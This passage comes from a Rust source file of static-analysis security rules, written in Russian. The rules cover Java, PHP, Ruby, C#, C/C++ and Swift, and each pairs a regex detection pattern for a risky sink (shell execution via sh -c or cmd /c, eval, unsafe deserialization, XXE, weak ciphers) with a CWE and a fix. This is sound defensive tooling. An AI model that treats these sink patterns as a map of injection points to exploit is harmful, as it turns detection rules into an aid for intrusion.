        id: "VS-JV-001",
        title: "Runtime.exec() — выполнение внешней команды",
        description: "Передача собранной строки в Runtime.exec() позволяет подставить в неё пользовательские данные, что даёт инъекцию команд.",
        recommendation: "Используйте ProcessBuilder со списком аргументов и никогда не склеивайте команду из строк.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Инъекция команд",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r"Runtime\.getRuntime\s*\(\s*\)\s*\.exec\s*\(",
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-002",
        title: "SQL-запрос собирается конкатенацией",
        description: "Склейка значений с текстом SQL через + позволяет атакующему дописать свои конструкции в запрос.",
        recommendation: "Используйте PreparedStatement с параметрами: ps.setString(1, name).",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "SQL-инъекция",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r#"(?i)(?:executeQuery|executeUpdate|execute)\s*\(\s*["'][^"']*(?:select |insert |update |delete )[^"']*["']\s*\+"#,
        unless_contains: &[],
        cwe: &["CWE-89"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/89.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-003",
        title: "Десериализация через ObjectInputStream",
        description: "readObject() восстанавливает произвольные классы и вызывает их методы. На недоверенных данных это классический вектор RCE в Java.",
        recommendation: "Не десериализуйте недоверенные данные. Используйте JSON с явной схемой или ObjectInputFilter с белым списком классов.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Небезопасная десериализация",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r"new\s+ObjectInputStream\s*\(|\.readObject\s*\(\s*\)",
        unless_contains: &["ObjectInputFilter", "setObjectInputFilter"],
        cwe: &["CWE-502"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://cwe.mitre.org/data/definitions/502.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-004",
        title: "Разбор XML уязвим к XXE",
        description: "Парсеры XML в Java по умолчанию раскрывают внешние сущности, что даёт чтение локальных файлов и SSRF.",
        recommendation: "Отключите внешние сущности: factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true).",
        severity: Severity::High,
        confidence: Confidence::Low,
        category: "XXE",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r"(?:DocumentBuilderFactory|SAXParserFactory|XMLInputFactory)\.newInstance\s*\(",
        unless_contains: &["disallow-doctype-decl", "setFeature", "IS_SUPPORTING_EXTERNAL_ENTITIES"],
        cwe: &["CWE-611"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/611.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-005",
        title: "Слабый хеш (MD5/SHA-1)",
        description: "MD5 и SHA-1 подвержены коллизиям, их нельзя применять для подписей и проверки целостности.",
        recommendation: "Берите MessageDigest.getInstance(\"SHA-256\"). Для паролей — BCrypt или Argon2.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Криптография",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r#"MessageDigest\.getInstance\s*\(\s*["'](?:MD5|SHA-?1)["']"#,
        unless_contains: &[],
        cwe: &["CWE-327", "CWE-328"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/327.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-JV-006",
        title: "Шифрование в режиме ECB",
        description: "ECB шифрует одинаковые блоки одинаково, поэтому структура открытого текста видна в шифротексте.",
        recommendation: "Используйте AES/GCM/NoPadding со случайным IV на каждое сообщение.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Криптография",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r#"Cipher\.getInstance\s*\(\s*["'][^"']*ECB"#,
        unless_contains: &[],
        cwe: &["CWE-327"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/327.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-007",
        title: "Слабый шифр (DES/RC4)",
        description: "DES, RC4 и RC2 давно взломаны: короткий ключ или предсказуемый поток позволяют восстановить открытый текст.",
        recommendation: "Используйте Cipher.getInstance(\"AES/GCM/NoPadding\") со случайным IV на каждое сообщение.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Криптография",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r#"Cipher\.getInstance\s*\(\s*["'](?:DES|RC4|RC2|ARCFOUR|Blowfish)\b"#,
        unless_contains: &[],
        cwe: &["CWE-327"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/327.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-008",
        title: "Проверка имени хоста TLS отключена",
        description: "ALLOW_ALL_HOSTNAME_VERIFIER и NoopHostnameVerifier принимают сертификат для любого домена. Это открывает соединение для man-in-the-middle.",
        recommendation: "Уберите кастомный verifier и используйте проверку по умолчанию. Сертификат должен соответствовать хосту.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r"ALLOW_ALL_HOSTNAME_VERIFIER|NoopHostnameVerifier",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/295.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-009",
        title: "CORS разрешён для любого источника",
        description: "Разрешённый источник \"*\" позволяет любому сайту слать запросы с полномочиями пользователя. В связке с cookie это ведёт к краже данных.",
        recommendation: "Перечислите доверенные источники явным списком вместо \"*\". Не используйте wildcard с credentials.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r#"(?i)(?:setAllowedOrigins|allowedOrigins|allowedOriginPatterns)\s*\([^)]*["']\*["']"#,
        unless_contains: &[],
        cwe: &["CWE-942"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/942.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-010",
        title: "SnakeYAML: небезопасная загрузка",
        description: "new Yaml().load() с конструктором по умолчанию создаёт произвольные Java-объекты по тегам в YAML. На недоверенных данных это ведёт к выполнению кода.",
        recommendation: "Создавайте Yaml с SafeConstructor: new Yaml(new SafeConstructor(new LoaderOptions())).",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "Небезопасная десериализация",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r"new\s+Yaml\s*\([^)]*\)\s*\.\s*load",
        unless_contains: &["SafeConstructor"],
        cwe: &["CWE-502"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://cwe.mitre.org/data/definitions/502.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-011",
        title: "XXE в dom4j/JDOM (SAXReader/SAXBuilder)",
        description: "SAXReader (dom4j) и SAXBuilder (JDOM) по умолчанию раскрывают внешние сущности XML, что даёт чтение локальных файлов и SSRF.",
        recommendation: "Отключите внешние сущности: setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true) на парсере.",
        severity: Severity::High,
        confidence: Confidence::Low,
        category: "XXE",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r"new\s+(?:SAXReader|SAXBuilder)\s*\(",
        unless_contains: &["disallow-doctype-decl", "setFeature"],
        cwe: &["CWE-611"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/611.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-012",
        title: "ProcessBuilder запускает шелл",
        description: "ProcessBuilder с sh -c, bash -c или cmd /c отдаёт разбор строки шеллу. Подстановка данных извне в такую команду даёт инъекцию.",
        recommendation: "Передавайте программу и аргументы отдельными элементами списка, без sh -c: new ProcessBuilder(\"git\", \"log\", branch).",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Инъекция команд",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r#"(?i)new\s+ProcessBuilder\s*\([^)]*["'](?:/bin/)?(?:sh|bash|zsh|cmd(?:\.exe)?)["']\s*,\s*["'](?:-c|/c)["']"#,
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },

    // ------------------------------------------------------------------- PHP
    Rule {
        id: "VS-PH-001",
        title: "eval() — выполнение произвольного кода",
        description: "eval() исполняет строку как PHP. Любое влияние пользователя на аргумент означает полную компрометацию.",
        recommendation: "Уберите eval(). Для данных используйте json_decode(), для выбора поведения — массив-диспетчер.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: &[Language::Php],
        pattern: r"\beval\s*\(",
        unless_contains: &[],
        cwe: &["CWE-95"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/95.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-PH-002",
        title: "Выполнение системной команды",
        description: "system(), exec(), shell_exec() и passthru() запускают команду через шелл. Пользовательский ввод в аргументе даёт инъекцию.",
        recommendation: "Экранируйте аргументы через escapeshellarg(), а лучше избегайте вызова внешних команд.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Инъекция команд",
        languages: &[Language::Php],
        pattern: r"\b(?:system|exec|shell_exec|passthru|popen|proc_open)\s*\(",
        unless_contains: &["escapeshellarg", "escapeshellcmd"],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PH-003",
        title: "SQL-запрос собирается интерполяцией",
        description: "Подстановка переменных в текст SQL не экранирует кавычки — это SQL-инъекция.",
        recommendation: "Используйте подготовленные запросы PDO: $stmt = $pdo->prepare(\"SELECT * FROM t WHERE id = ?\"); $stmt->execute([$id]).",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "SQL-инъекция",
        languages: &[Language::Php],
        pattern: r#"(?i)(?:mysqli_query|->query|->exec)\s*\(\s*["'][^"']*(?:select |insert |update |delete )[^"']*\$"#,
        unless_contains: &[],
        cwe: &["CWE-89"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/89.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PH-004",
        title: "Небезопасная десериализация",
        description: "unserialize() на недоверенных данных вызывает магические методы объектов и приводит к выполнению кода (POP-цепочки).",
        recommendation: "Используйте json_decode(). Если unserialize() необходим — ограничьте классы: unserialize($data, ['allowed_classes' => false]).",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Небезопасная десериализация",
        languages: &[Language::Php],
        pattern: r"\bunserialize\s*\(",
        unless_contains: &["allowed_classes"],
        cwe: &["CWE-502"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://www.php.net/manual/en/function.unserialize.php"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PH-005",
        title: "Подключение файла по переменной (LFI/RFI)",
        description: "include/require с переменной в пути позволяет подключить произвольный файл, а при allow_url_include — и удалённый.",
        recommendation: "Подключайте только пути из белого списка. Никогда не передавайте пользовательский ввод в include.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "Path traversal",
        languages: &[Language::Php],
        pattern: r"(?:include|require)(?:_once)?\s*(?:\(\s*)?\$",
        unless_contains: &[],
        cwe: &["CWE-98", "CWE-22"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/98.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PH-006",
        title: "Вывод суперглобала без экранирования (XSS)",
        description: "echo/print значения из $_GET, $_POST или $_REQUEST напрямую вставляет пользовательский ввод в HTML — это отражённый XSS.",
        recommendation: "Экранируйте вывод через htmlspecialchars($value, ENT_QUOTES) перед вставкой в страницу.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "XSS",
        languages: &[Language::Php],
        pattern: r"(?i)\b(?:echo|print)\s+\$_(?:GET|POST|REQUEST|COOKIE)\b",
        unless_contains: &["htmlspecialchars", "htmlentities"],
        cwe: &["CWE-79"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/79.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PH-007",
        title: "extract() на пользовательских данных",
        description: "extract($_GET/$_POST) создаёт переменные по ключам из запроса и может перезаписать уже существующие, подменяя логику и обходя проверки.",
        recommendation: "Не применяйте extract() к суперглобалам. Читайте нужные поля явно: $id = $_GET['id'].",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Контроль доступа",
        languages: &[Language::Php],
        pattern: r"extract\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE|SERVER)",
        unless_contains: &[],
        cwe: &["CWE-915"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/915.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PH-008",
        title: "preg_replace с модификатором /e",
        description: "Модификатор /e заставляет preg_replace выполнять замену как код PHP. На данных из запроса это выполнение произвольного кода.",
        recommendation: "Замените на preg_replace_callback() и формируйте результат в функции обратного вызова без eval.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: &[Language::Php],
        pattern: r#"preg_replace\s*\(\s*["'][^"']*/[a-zA-Z]*e[a-zA-Z]*["']"#,
        unless_contains: &[],
        cwe: &["CWE-95"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/95.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PH-009",
        title: "Открытый редирект / инъекция заголовка",
        description: "header(\"Location: ...\") с пользовательским вводом даёт открытый редирект, а перевод строки в значении — расщепление HTTP-ответа (HTTP response splitting).",
        recommendation: "Редиректьте только на пути из белого списка и вырезайте переводы строк из значения заголовка.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Открытый редирект",
        languages: &[Language::Php],
        pattern: r#"(?i)header\s*\(\s*["']location:[^)]*\$_(?:GET|POST|REQUEST|COOKIE)"#,
        unless_contains: &[],
        cwe: &["CWE-601", "CWE-113"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/601.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PH-010",
        title: "assert() со строковым аргументом",
        description: "assert() со строкой исполняет её как PHP-код. Пользовательский ввод в этой строке приводит к выполнению произвольного кода.",
        recommendation: "Не передавайте строки в assert(). Проверяйте условия обычными выражениями и бросайте исключения.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: &[Language::Php],
        pattern: r#"\bassert\s*\(\s*["']"#,
        unless_contains: &[],
        cwe: &["CWE-95"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/95.html"],
        skip_in_tests: true,
    },

    // ------------------------------------------------------------------ Ruby
    Rule {
        id: "VS-RB-001",
        title: "Выполнение команды через шелл",
        description: "Обратные кавычки, system() и %x запускают команду через шелл. Интерполяция пользовательских данных даёт инъекцию.",
        recommendation: "Передавайте аргументы массивом: system(\"git\", \"log\", branch) — так шелл не участвует.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Инъекция команд",
        languages: &[Language::Ruby],
        pattern: r"(?:`[^`]*#\{|%x\[|%x\(|\bsystem\s*\(\s*[\x22'][^\x22']*#\{)",
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-RB-002",
        title: "SQL-запрос собирается интерполяцией",
        description: "Интерполяция #{} в where/find_by_sql не экранирует значения — это SQL-инъекция в Rails.",
        recommendation: "Передавайте параметры отдельно: where(\"id = ?\", id) или where(id: id).",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "SQL-инъекция",
        languages: &[Language::Ruby],
        pattern: r#"(?:where|find_by_sql|execute)\s*\(?\s*["'][^"']*#\{"#,
        unless_contains: &[],
        cwe: &["CWE-89"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://rails-sqli.org/"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-RB-003",
        title: "Небезопасная десериализация YAML/Marshal",
        description: "YAML.load и Marshal.load восстанавливают произвольные объекты Ruby и приводят к выполнению кода.",
        recommendation: "Используйте YAML.safe_load(data). Marshal на недоверенных данных применять нельзя.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Небезопасная десериализация",
        languages: &[Language::Ruby],
        pattern: r"(?:YAML|Marshal)\.load\s*\(",
        unless_contains: &["safe_load"],
        cwe: &["CWE-502"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://cwe.mitre.org/data/definitions/502.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-RB-004",
        title: "eval() — выполнение произвольного кода",
        description: "eval() исполняет строку как код Ruby. Если в неё попадают данные извне, это полная компрометация процесса.",
        recommendation: "Уберите eval(). Для выбора поведения используйте хэш-диспетчер или case, для данных — JSON.parse.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: &[Language::Ruby],
        pattern: r"\beval\s*\(",
        unless_contains: &[],
        cwe: &["CWE-95"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/95.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-RB-005",
        title: "html_safe / raw отключает экранирование во вью",
        description: "html_safe и raw помечают строку как безопасный HTML, и Rails вставляет её без экранирования. Пользовательский ввод в ней даёт XSS.",
        recommendation: "Не вызывайте html_safe на пользовательских данных. Для нужной разметки используйте sanitize с белым списком тегов.",
        severity: Severity::Medium,
        confidence: Confidence::Low,
        category: "XSS",
        languages: &[Language::Ruby],
        pattern: r"\.html_safe\b|\braw\s*\(",
        unless_contains: &["sanitize"],
        cwe: &["CWE-79"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/79.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-RB-006",
        title: "Вызов метода по имени из запроса (send)",
        description: "send/public_send с именем метода из params позволяет вызвать любой метод объекта, включая приватные, — это обход логики и контроля доступа.",
        recommendation: "Сверяйте имя метода с белым списком перед вызовом или используйте явный case по допустимым действиям.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Контроль доступа",
        languages: &[Language::Ruby],
        pattern: r"\.(?:send|public_send|__send__)\s*\(\s*params\b",
        unless_contains: &[],
        cwe: &["CWE-749"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://cwe.mitre.org/data/definitions/749.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-RB-007",
        title: "Открытый редирект через redirect_to",
        description: "redirect_to с адресом из params уводит пользователя на произвольный внешний сайт — основа фишинга и обхода доверенных доменов.",
        recommendation: "Разрешайте только относительные пути или проверяйте хост по белому списку; в Rails оставляйте allow_other_host по умолчанию выключенным.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Открытый редирект",
        languages: &[Language::Ruby],
        pattern: r"redirect_to\s+params\b",
        unless_contains: &[],
        cwe: &["CWE-601"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://cwe.mitre.org/data/definitions/601.html"],
        skip_in_tests: false,
    },

    // -------------------------------------------------------------------- C#
    Rule {
        id: "VS-CS-001",
        title: "SQL-запрос собирается конкатенацией или интерполяцией",
        description: "Склейка значений с текстом SQL не экранирует кавычки — пользовательский ввод меняет структуру запроса.",
        recommendation: "Используйте параметры: cmd.Parameters.AddWithValue(\"@id\", id).",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "SQL-инъекция",
        languages: &[Language::CSharp],
        pattern: r#"(?i)new\s+Sql(?:Command|DataAdapter)\s*\(\s*(?:\$)?["'][^"']*(?:select |insert |update |delete )"#,
        unless_contains: &["@"],
        cwe: &["CWE-89"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/89.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CS-002",
        title: "Небезопасная десериализация BinaryFormatter",
        description: "BinaryFormatter восстанавливает произвольные типы и признан небезопасным самим Microsoft — он удалён в .NET 9.",
        recommendation: "Перейдите на System.Text.Json или protobuf. BinaryFormatter применять нельзя.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Небезопасная десериализация",
        languages: &[Language::CSharp],
        pattern: r"BinaryFormatter|LosFormatter|NetDataContractSerializer|SoapFormatter",
        unless_contains: &[],
        cwe: &["CWE-502"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CS-003",
        title: "Отключена проверка TLS-сертификата",
        description: "Возврат true из ServerCertificateValidationCallback принимает любой сертификат — соединение уязвимо к MITM.",
        recommendation: "Уберите колбэк. Для внутреннего CA установите его сертификат в хранилище доверия.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: &[Language::CSharp],
        pattern: r"ServerCertificateValidationCallback\s*(?:\+)?=\s*(?:delegate|\()",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/295.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CS-004",
        title: "Команда запускается через шелл",
        description: "Process.Start с cmd.exe, powershell или /bin/sh отдаёт разбор строки шеллу. Подстановка данных извне даёт инъекцию команд.",
        recommendation: "Запускайте программу напрямую через ProcessStartInfo с Arguments-списком и UseShellExecute = false.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Инъекция команд",
        languages: &[Language::CSharp],
        pattern: r#"(?i)Process\.Start\s*\(\s*(?:new\s+ProcessStartInfo\s*\(\s*)?["'](?:cmd|cmd\.exe|powershell|powershell\.exe|/bin/sh|/bin/bash|bash)["']"#,
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CS-005",
        title: "Слабый хеш (MD5/SHA-1)",
        description: "MD5 и SHA-1 подвержены коллизиям и не годятся для подписей и проверки целостности.",
        recommendation: "Используйте SHA256.Create(). Для паролей — PBKDF2 (Rfc2898DeriveBytes), bcrypt или Argon2.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Криптография",
        languages: &[Language::CSharp],
        pattern: r"(?:MD5|SHA1)\.Create\s*\(|new\s+(?:MD5|SHA1)CryptoServiceProvider",
        unless_contains: &[],
        cwe: &["CWE-327", "CWE-328"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/327.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-CS-006",
        title: "Устаревшая версия TLS/SSL",
        description: "SSL 3.0 и TLS 1.0/1.1 содержат известные уязвимости (POODLE, BEAST) и выведены из эксплуатации.",
        recommendation: "Не задавайте SecurityProtocol вручную — пусть ОС выберет актуальную версию, либо укажите Tls12/Tls13.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: &[Language::CSharp],
        pattern: r"SecurityProtocolType\.(?:Ssl3|Tls11|Tls)\b",
        unless_contains: &[],
        cwe: &["CWE-326"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/326.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CS-007",
        title: "Отключена проверка TLS-сертификата (HttpClient)",
        description: "ServerCertificateCustomValidationCallback, возвращающий true, или DangerousAcceptAnyServerCertificateValidator заставляют HttpClient принять любой сертификат — соединение уязвимо к MITM.",
        recommendation: "Уберите колбэк. Для внутреннего CA добавьте его сертификат в доверенное хранилище.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: &[Language::CSharp],
        pattern: r"ServerCertificateCustomValidationCallback|DangerousAcceptAnyServerCertificateValidator",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/295.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CS-008",
        title: "Открытый редирект через Response.Redirect",
        description: "Response.Redirect с адресом из запроса уводит пользователя на произвольный сайт — вектор фишинга и обхода доверенных доменов.",
        recommendation: "Разрешайте только локальные адреса: проверяйте Url.IsLocalUrl(target) перед редиректом.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Открытый редирект",
        languages: &[Language::CSharp],
        pattern: r"(?i)Response\.Redirect\s*\(\s*(?:Request\.|[\w]*\.QueryString|[\w]*\.Query\b)",
        unless_contains: &[],
        cwe: &["CWE-601"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/601.html"],
        skip_in_tests: false,
    },

    // ----------------------------------------------------------------- C/C++
    Rule {
        id: "VS-C-001",
        title: "Небезопасная функция копирования строк",
        description: "strcpy, strcat, sprintf и gets не проверяют размер буфера. Это классическое переполнение буфера с перезаписью стека.",
        recommendation: "Используйте strncpy/strncat/snprintf с явным размером, а лучше std::string в C++. gets() удалён из стандарта C11.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Безопасность памяти",
        languages: &[Language::C, Language::Cpp],
        pattern: r"\b(?:strcpy|strcat|sprintf|gets|vsprintf)\s*\(",
        unless_contains: &[],
        cwe: &["CWE-120", "CWE-787"],
        owasp: None,
        references: &["https://cwe.mitre.org/data/definitions/120.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-C-002",
        title: "Форматная строка из переменной",
        description: "printf(var) вместо printf(\"%s\", var) позволяет через %n и %x читать и писать память — это атака на форматную строку.",
        recommendation: "Всегда указывайте формат явно: printf(\"%s\", user_input).",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Безопасность памяти",
        languages: &[Language::C, Language::Cpp],
        pattern: r"\b(?:printf|fprintf|syslog)\s*\(\s*[a-z_][a-z0-9_]*\s*\)",
        unless_contains: &[],
        cwe: &["CWE-134"],
        owasp: None,
        references: &["https://cwe.mitre.org/data/definitions/134.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-C-003",
        title: "Вызов system() с собранной строкой",
        description: "system() выполняет команду через шелл. Данные извне в этой строке дают инъекцию команд.",
        recommendation: "Используйте execve() с массивом аргументов вместо system().",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Инъекция команд",
        languages: &[Language::C, Language::Cpp],
        pattern: r"\bsystem\s*\(",
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-C-004",
        title: "scanf(\"%s\") без ограничения длины",
        description: "%s в scanf/sscanf без ширины поля читает ввод любой длины в буфер фиксированного размера — переполнение буфера.",
        recommendation: "Указывайте максимальную ширину: scanf(\"%63s\", buf) для буфера в 64 байта, либо используйте fgets.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Безопасность памяти",
        languages: &[Language::C, Language::Cpp],
        pattern: r#"\b(?:scanf|sscanf|fscanf)\s*\(\s*[^;]*%s"#,
        unless_contains: &[],
        cwe: &["CWE-120"],
        owasp: None,
        references: &["https://cwe.mitre.org/data/definitions/120.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-C-005",
        title: "Небезопасное создание временного файла",
        description: "tmpnam, tempnam и mktemp возвращают имя, но не создают файл атомарно. Между проверкой и открытием возможна подмена (race, символическая ссылка).",
        recommendation: "Используйте mkstemp(), который создаёт и открывает файл одним атомарным вызовом.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Работа с файлами",
        languages: &[Language::C, Language::Cpp],
        pattern: r"\b(?:tmpnam|tempnam|mktemp)\s*\(",
        unless_contains: &[],
        cwe: &["CWE-377"],
        owasp: None,
        references: &["https://cwe.mitre.org/data/definitions/377.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-C-006",
        title: "Слабый генератор случайных чисел",
        description: "rand()/random() — предсказуемые PRNG. Токены, ключи и соли, полученные из них, восстанавливаются по нескольким значениям.",
        recommendation: "Для безопасности используйте getrandom(2), /dev/urandom или arc4random.",
        severity: Severity::Low,
        confidence: Confidence::Low,
        category: "Криптография",
        languages: &[Language::C, Language::Cpp],
        pattern: r"\b(?:rand|random|srand)\s*\(",
        unless_contains: &["arc4random", "getrandom"],
        cwe: &["CWE-338"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/338.html"],
        skip_in_tests: true,
    },

    // ----------------------------------------------------------------- Swift
    Rule {
        id: "VS-SW-001",
        title: "Использование устаревшего UIWebView",
        description: "UIWebView снят с поддержки Apple и не получает исправлений безопасности. Он не изолирует контент от приложения и уязвим к инъекциям.",
        recommendation: "Перейдите на WKWebView: он выполняет контент в отдельном процессе и поддерживает современные политики безопасности.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Swift],
        pattern: r"\bUIWebView\b",
        unless_contains: &[],
        cwe: &["CWE-1104"],
        owasp: Some(OWASP_VULN_COMP),
